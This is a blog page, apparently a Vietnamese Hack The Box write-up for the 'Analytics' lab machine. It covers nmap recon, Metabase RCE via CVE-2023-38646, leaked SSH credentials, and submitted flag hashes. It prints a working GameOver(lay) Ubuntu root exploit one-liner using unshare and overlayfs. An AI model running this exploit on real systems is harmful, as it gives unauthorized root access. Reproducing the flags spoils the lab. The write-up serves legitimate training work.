@@ -1,0 +1,355 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Week 2 - Analytics | 0x5h1n0k0</title><meta name="robots" content="noindex"><meta name="author" content="0x5h1n0k0"><meta name="copyright" content="0x5h1n0k0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#100e17"><meta name="description" content="Difficulty - Easy"><link rel="shortcut icon" href="/2/img/ava.png"><link rel="canonical" href="https://0x5h1n0k0.github.io/2/posts/6833642b/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/2/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@500&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/2/',
+  algolia: undefined,
+  localSearch: {"path":"/2/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"Author: 0x5h1n0k0","link":"Link: ","source":"Source: 0x5h1n0k0","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source."}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#bb86fc","bgDark":"#bb86fc","position":"bottom-center"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Week 2 - Analytics',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-11-25 15:50:53'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#100e17')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/2/css/cus.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="/css/year.css"  media="defer" onload="this.media='all'"><script src="https://www.jq22.com/jquery/jquery-3.3.1.js"></script><script data-pjax src="/2/js/echarts.min.js"></script><script data-pjax src="/2/js/charts.js"></script><!-- hexo injector head_end start -->
+<link rel="stylesheet" href="/2/css/collapse.css">
+<link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><style type="text/css">
+.spoiler {
+  display: inline-flex;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/2/img/shi-2.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/2/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a><a href="/2/tags/"><div class="headline">Tags</div><div class="length-num">192</div></a><a href="/2/categories/"><div class="headline">Categories</div><div class="length-num">41</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/2/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/2/about/"><i class="fa-fw fa-regular fa-address-card"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://www.hackthebox.com/storage/avatars/f86fcf4c1cfcc690b43f43e100f89718.png')"><nav id="nav"><span id="blog-info"><a href="/2/" title="0x5h1n0k0"><span class="site-name">0x5h1n0k0</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/2/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/2/about/"><i class="fa-fw fa-regular fa-address-card"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Week 2 - Analytics</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-11-24T13:31:59.000Z" title="Created 2023-11-24 20:31:59">2023-11-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-11-25T08:50:53.048Z" title="Updated 2023-11-25 15:50:53">2023-11-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/2/categories/Hack-The-Box/">Hack The Box</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/2/categories/Hack-The-Box/Open-beta-season-III-Fall-2023/">Open beta season III (Fall 2023)</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">546</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>3mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Week 2 - Analytics"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><script src='https://unpkg.com/tippy.js@2.0.2/dist/tippy.all.min.js'></script>
+<script src='/js/attachTooltips.js'></script>
+<link rel='stylesheet' href='/css/tippy.css'>
+<link rel="stylesheet" type="text&#x2F;css" href="https://cdn.jsdelivr.net/npm/hexo-tag-hint@0.3.1/dist/hexo-tag-hint.min.css"><div class="fnScope" scope="1"><div class="note green icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>📖 Difficulty: Easy<br>
+⚔️ Accessing the room at <a target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/569">https://app.hackthebox.com/machines/569</a></p>
+</div><details class="toggle"><summary class="toggle-button" style=""><h1 class="thm-h1-task"><strong style="color:#88cc14">Flags <i class="fa-circle-check"></i></strong> <strong></strong></h1></summary><div class="toggle-content"><div class="thm-ans vertical-align-custom success"><div>Submitted flags</div></div>
+<div class="hide-block"><button type="button" class="hide-button" style="">User Flag
+    </button><div class="hide-content"><p class="text-input">51321d0af572b399dcc9d3a1e9a859e3</p></div></div>
+<div class="hide-block"><button type="button" class="hide-button" style="">Root Flag
+    </button><div class="hide-content"><p class="text-input">380e5ac21e25a4d5e417723849f52fb8</p></div></div>
+</div></details><hr><h1><strong>Pentest scenario</strong></h1><h2 id="Victim-machine"><strong>Victim machine</strong></h2><p>Target: 10.10.11.233</p><h2 id="Reconnaissance"><strong>Reconnaissance</strong></h2><p>Nmap output:</p><figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10</span>.<span class="number">10</span>.<span class="number">11</span>.<span class="number">233</span></span><br><span class="line">Host is up (<span class="number">0</span>.<span class="number">54</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span>/tcp open  http    nginx <span class="number">1</span>.<span class="number">18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">|_http-<span class="built_in">title</span>: Did <span class="keyword">not</span> follow redirect to http://analytical.htb/</span><br><span class="line">|_http-server-header: nginx/<span class="number">1</span>.<span class="number">18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line"><span class="function">Warning: <span class="title">OSScan</span> <span class="title">results</span> <span class="title">may</span> <span class="title">be</span> <span class="title">unreliable</span> <span class="title">because</span> <span class="title">we</span> <span class="title">could</span> <span class="title">not</span> <span class="title">find</span> <span class="title">at</span> <span class="title">least</span> 1 <span class="title">open</span> <span class="title">and</span> 1 <span class="title">closed</span> <span class="title">port</span></span></span><br><span class="line"><span class="function"><span class="title">Aggressive</span> <span class="title">OS</span> <span class="title">guesses</span>: <span class="title">Linux</span> 4.15 - 5.6 (95%), <span class="title">Linux</span> 5.3 - 5.4 (95%), <span class="title">Linux</span> 2.6.32 (95%), <span class="title">Linux</span> 5.0 - 5.3 (95%), <span class="title">Linux</span> 3.1 (95%), <span class="title">Linux</span> 3.2 (95%), <span class="title">AXIS</span> 210<span class="title">A</span> <span class="title">or</span> 211 <span class="title">Network</span> <span class="title">Camera</span> (<span class="title">Linux</span> 2.6.17) (94%), <span class="title">ASUS</span> <span class="title">RT</span>-<span class="title">N56U</span> <span class="title">WAP</span> (<span class="title">Linux</span> 3.4) (93%), <span class="title">Linux</span> 3.16 (93%), <span class="title">Linux</span> 5.0 - 5.4 (93%)</span></span><br><span class="line"><span class="function"><span class="title">No</span> <span class="title">exact</span> <span class="title">OS</span> <span class="title">matches</span> <span class="title">for</span> <span class="title">host</span> (<span class="title">test</span> <span class="title">conditions</span> <span class="title">non</span>-<span class="title">ideal</span>).</span></span><br><span class="line"><span class="function"><span class="title">Network</span> <span class="title">Distance</span>: 2 <span class="title">hops</span></span></span><br><span class="line"><span class="function"><span class="title">Service</span> <span class="title">Info</span>: <span class="title">OS</span>: <span class="title">Linux</span>; <span class="title">CPE</span>: <span class="title">cpe</span>:/<span class="title">o:linux</span>:<span class="title">linux_kernel</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">TRACEROUTE</span> (<span class="title">using</span> <span class="title">port</span> 80/<span class="title">tcp</span>)</span></span><br><span class="line"><span class="function"><span class="title">HOP</span> <span class="title">RTT</span>       <span class="title">ADDRESS</span></span></span><br><span class="line"><span class="function">1   569.72 <span class="title">ms</span> 10.10.16.1</span></span><br><span class="line"><span class="function">2   278.68 <span class="title">ms</span> 10.10.11.233</span></span><br></pre></td></tr></tbody></table></figure><p>Đầu tiên ta cần chỉnh host qua <code>analytical.htb</code> để có thể truy cập website.</p><img src="/2/posts/6833642b/image.png" class=""><p>Sau một vài recon ta sẽ add thêm <code>data.analytical.htb</code> là subdomain của <code>analytical.htb</code>. Và ta recon ra url <code>http://data.analytical.htb/auth/login</code> để truy cập trang login của website.</p><img src="/2/posts/6833642b/image-1.png" class=""><p>Hơn nữa, ta có thể scan được target đang mở service SSH port 22.</p><p>Sau một hồi lang thang trên mạng ta tìm được 1 vài CVE của Metabase liên quan đến việc lộ setup-token và dẫn đến việc hacker có thể thực thi RCE. Quan trọng hơn, hacker có thể tạo reverse shell trên nó.</p><h2 id="Initial-Access"><strong>Initial Access</strong></h2><p>Dựa vào <a href="/2/posts/80cac3d5/">CVE-2023-38646</a> ta có thể bước đầu tiếp cận target</p><img src="/2/posts/6833642b/image-2.png" class=""><p>Sau khi tiếp cận target, ta có thể thấy victim để lộ các thông tin quan trọng ở các biến môi trường như hình dưới</p><img src="/2/posts/6833642b/image-3.png" class=""><div class="note primary flat"><p>Username: metalytics<br>
+Password: An4lytics_ds20223#</p>
+</div><p>Có thể đây là user/pass để truy cập SSH. Và rất may ta truy cập thành công thông qua nó</p><img src="/2/posts/6833642b/image-4.png" class=""><p>Ta lượm nhặt được file exploit</p><figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># CVE-<span class="number">2023</span>-<span class="number">2640</span> CVE-<span class="number">2023</span>-<span class="number">3262</span>: GameOver(lay) Ubuntu Privilege Escalation</span><br><span class="line"># by g1vi https://github.com/g1vi</span><br><span class="line"># October <span class="number">2023</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> "[+] You should be root now"</span><br><span class="line"><span class="built_in">echo</span> "[+] <span class="built_in">Type</span> '<span class="keyword">exit</span>' to finish and leave the house cleaned"</span><br><span class="line"></span><br><span class="line">unshare -rm sh -c "<span class="built_in">mkdir</span> l u w m &amp;&amp; cp /u*/b*/p*<span class="number">3</span> l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;" &amp;&amp; u/python3 -c 'import os;os.setuid(<span class="number">0</span>);os.system("cp /bin/bash /var/tmp/bash &amp;&amp; chmod <span class="number">4755</span> /var/tmp/bash &amp;&amp; /var/tmp/bash -p &amp;&amp; rm -rf l m u w /var/tmp/bash")'</span><br></pre></td></tr></tbody></table></figure><p>Thực thi file này ta sẽ có được root.</p></div><!-- flag of hidden posts --></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://0x5h1n0k0.github.io/2">0x5h1n0k0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://0x5h1n0k0.github.io/2/posts/6833642b/">https://0x5h1n0k0.github.io/2/posts/6833642b/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/2/tags/Linux/">Linux</a><a class="post-meta__tags" href="/2/tags/CVE-2023-38646/">CVE-2023-38646</a><a class="post-meta__tags" href="/2/tags/CVE-2023-2640/">CVE-2023-2640</a><a class="post-meta__tags" href="/2/tags/CVE-2023-32629/">CVE-2023-32629</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/2/img/shi-2.png" onerror="this.onerror=null;this.src='/2/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">0x5h1n0k0</div><div class="author-info__description">Nothing to show!</div></div><div class="card-info-data site-data is-center"><a href="/2/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a><a href="/2/tags/"><div class="headline">Tags</div><div class="length-num">192</div></a><a href="/2/categories/"><div class="headline">Categories</div><div class="length-num">41</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/0x5h1n0k0"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Flags  </span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">Pentest scenario</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Victim-machine"><span class="toc-number">2.1.</span> <span class="toc-text">Victim machine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reconnaissance"><span class="toc-number">2.2.</span> <span class="toc-text">Reconnaissance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access"><span class="toc-number">2.3.</span> <span class="toc-text">Initial Access</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2/posts/68cc253f/" title="0x5h1n0k0"><img src="/2/img/shi_be-2.jpg" onerror="this.onerror=null;this.src='/2/img/404.jpg'" alt="0x5h1n0k0"/></a><div class="content"><a class="title" href="/2/posts/68cc253f/" title="0x5h1n0k0">0x5h1n0k0</a><time datetime="2023-10-14T20:48:22.000Z" title="Created 2023-10-15 03:48:22">2023-10-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2/posts/67caa546/" title="CVEs"><img src="/2/posts/67caa546/image.png" onerror="this.onerror=null;this.src='/2/img/404.jpg'" alt="CVEs"/></a><div class="content"><a class="title" href="/2/posts/67caa546/" title="CVEs">CVEs</a><time datetime="2023-09-25T16:47:03.000Z" title="Created 2023-09-25 23:47:03">2023-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2/posts/1632e7c/" title="Hack The Box"><img src="/2/posts/1632e7c/hackthebox.png" onerror="this.onerror=null;this.src='/2/img/404.jpg'" alt="Hack The Box"/></a><div class="content"><a class="title" href="/2/posts/1632e7c/" title="Hack The Box">Hack The Box</a><time datetime="2023-09-25T11:11:33.000Z" title="Created 2023-09-25 18:11:33">2023-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2/posts/c75098e/" title="TryHackMe"><img src="/2/posts/c75098e/image.png" onerror="this.onerror=null;this.src='/2/img/404.jpg'" alt="TryHackMe"/></a><div class="content"><a class="title" href="/2/posts/c75098e/" title="TryHackMe">TryHackMe</a><time datetime="2023-09-25T05:29:19.000Z" title="Created 2023-09-25 12:29:19">2023-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2/posts/a922f8e1/" title="Damn Vulnerable Web Application"><img src="https://github.com/0x5h1n0k0/0x5h1n0k0.github.io/assets/141578891/22e8d3a4-81ba-4ddf-9a4f-cb6b66fe7ae8" onerror="this.onerror=null;this.src='/2/img/404.jpg'" alt="Damn Vulnerable Web Application"/></a><div class="content"><a class="title" href="/2/posts/a922f8e1/" title="Damn Vulnerable Web Application">Damn Vulnerable Web Application</a><time datetime="2023-09-23T08:01:30.182Z" title="Created 2023-09-23 15:01:30">2023-09-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 By 0x5h1n0k0</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/2/js/utils.js"></script><script src="/2/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.1
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, '']
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typesetPromise()
+}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex/dist/contrib/copy-tex.min.js"></script><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', { class: 'katex-wrap'})
+  })
+})()</script><script>(() => {
+  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaid.length === 0) return
+  const runMermaid = () => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from($mermaid).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const loadMermaid = () => {
+    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
+  }
+
+  btf.addGlobalFn('themeChange', runMermaid, 'mermaid')
+
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  const abcjsInit = () => {
+    const abcjsFn = () => {
+      document.querySelectorAll(".abc-music-sheet").forEach(ele => {
+        ABCJS.renderAbc(ele, ele.innerHTML, {responsive: 'resize'})
+      })
+    }
+    
+    typeof ABCJS === 'object' ? abcjsFn()
+      : getScript('https://cdn.jsdelivr.net/npm/abcjs/dist/abcjs-basic-min.min.js').then(abcjsFn)
+  }
+
+  window.pjax ? abcjsInit() : window.addEventListener('load', abcjsInit)
+})()</script><script>(()=>{
+  const getGiscusTheme = theme => {
+    return theme === 'dark' ? 'dark' : ''
+  }
+
+  const loadGiscus = () => {
+    const config = Object.assign({
+      src: 'https://giscus.app/client.js',
+      'data-repo': '0x5h1n0k0/2',
+      'data-repo-id': 'R_kgDOKXFugg',
+      'data-category-id': 'DIC_kwDOKXFugs4CZryo',
+      'data-mapping': 'pathname',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true
+    },null)
+
+    const ele = document.createElement('script')
+    for (let key in config) {
+      ele.setAttribute(key, config[key])
+    }
+    document.getElementById('giscus-wrap').appendChild(ele)
+  }
+
+  const changeGiscusTheme = theme => {
+    const sendMessage = message => {
+      const iframe = document.querySelector('iframe.giscus-frame')
